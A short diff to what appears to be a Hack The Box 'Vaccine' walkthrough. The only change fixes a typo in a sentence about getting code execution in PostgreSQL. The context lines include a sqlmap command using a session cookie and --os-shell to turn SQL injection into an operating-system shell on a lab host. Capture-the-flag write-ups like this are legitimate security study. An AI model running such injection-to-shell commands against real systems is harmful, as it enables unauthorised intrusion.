@@ -201,7 +201,7 @@ back-end DBMS: PostgreSQL
 
 [*] ending @ 10:23:37 /2021-01-07/
 ~~~
-With this knowledge, I was able to some code execution in Postgres with another sqlmap query.  
+With this knowledge, I was able to do some code execution in Postgres with another sqlmap query.  
 ~~~Bash
 ┌──(jessi㉿teatimesec)-[~/HTB/Vaccine]
 └─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=ooqgiruea2dt76b87rcd46dmov" --os-shell
